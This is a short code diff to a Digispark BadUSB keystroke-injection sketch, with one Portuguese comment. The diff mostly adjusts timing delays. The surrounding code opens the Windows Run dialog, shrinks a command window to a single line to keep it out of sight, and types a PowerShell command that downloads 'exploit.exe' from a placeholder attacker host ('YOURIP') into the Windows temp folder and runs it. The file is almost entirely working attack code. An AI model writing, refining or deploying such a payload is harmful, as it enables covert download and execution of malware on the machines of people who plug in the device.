@@ -41,18 +41,14 @@ pisca_led(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(2000);
   //Download assembly script
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.println("cmd /c powershell -Command wget 'http://YOURIP/exploit.exe' -Outfile c:/windows/temp/exploit.exe ; c:/windows/temp/exploit.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
